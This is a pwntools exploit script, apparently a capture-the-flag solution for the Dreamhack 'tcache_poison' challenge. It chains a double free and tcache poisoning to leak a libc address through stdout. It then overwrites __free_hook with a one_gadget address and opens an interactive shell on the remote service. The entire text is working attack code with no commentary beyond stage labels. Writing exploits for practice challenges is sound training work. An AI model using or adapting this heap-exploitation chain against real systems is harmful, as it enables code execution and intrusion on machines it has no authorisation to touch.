#!/usr/bin/env python3

from pwn import *

exe = ELF("tcache_poison_patched", checksec = False)
libc = ELF("libc-2.27.so", checksec = False)
ld = ELF("ld-2.27.so", checksec = False)

context.binary = exe


if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host1.dreamhack.games", 16853)

def alloc(size, data):
    p.sendlineafter(b'\n', str(1))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Content: ', data)

def free():
    p.sendlineafter(b'\n', str(2))

def show():
    p.sendlineafter(b'\n', str(3))

def edit(data):
    p.sendlineafter(b'\n', str(4))
    p.sendafter(b'Edit chunk: ', data)


input()
#stage 1 double free
alloc(0x30, b'aaaaaaaa')
free()
edit(b'\0'*0x10)
free()

alloc(0x30, p64(exe.sym['stdout']))
alloc(0x30, b'a'*8)
alloc(0x30, b'\x60')

#stage 2 leak libc
show()
p.recvuntil(b"Content: ")
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x3ec760
print("Libc leak: " + hex(libc_leak))
print("Libc base: " + hex(libc.address))

og = 0x4f432
alloc(0x40, b'aaaaaaaa')
free()
edit(b'\0'*0x10)
free()

alloc(0x40, p64(libc.sym['__free_hook']))
alloc(0x40, b'a'*8)
alloc(0x40, p64(og + libc.address))

free()


p.interactive()
